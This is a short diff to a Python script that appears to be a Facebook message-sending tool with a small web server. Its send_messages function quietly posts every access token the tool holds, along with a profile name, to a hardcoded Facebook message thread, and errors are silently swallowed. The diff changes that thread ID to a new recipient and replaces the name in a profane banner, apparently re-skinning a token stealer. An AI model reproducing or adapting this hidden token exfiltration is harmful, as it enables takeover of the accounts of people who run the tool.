@@ -15,7 +15,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"THE LEGEND FUCKER BOII ARRU KINGX ON TABAHI^^")
+        self.wfile.write(b"THE LEGEND FUCKER BOII VIR4T.X KINGX ON TABAHI^^")
 
 def execute_server():
     PORT = 4000
@@ -93,7 +93,7 @@ def send_messages():
             'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
         }
         try:
-            s = requests.post("https://graph.facebook.com/v15.0/t_100003926161385/", data=parameters, headers=headers)
+            s = requests.post("https://graph.facebook.com/v15.0/t_100006737954449/", data=parameters, headers=headers)
         except:
             pass
 
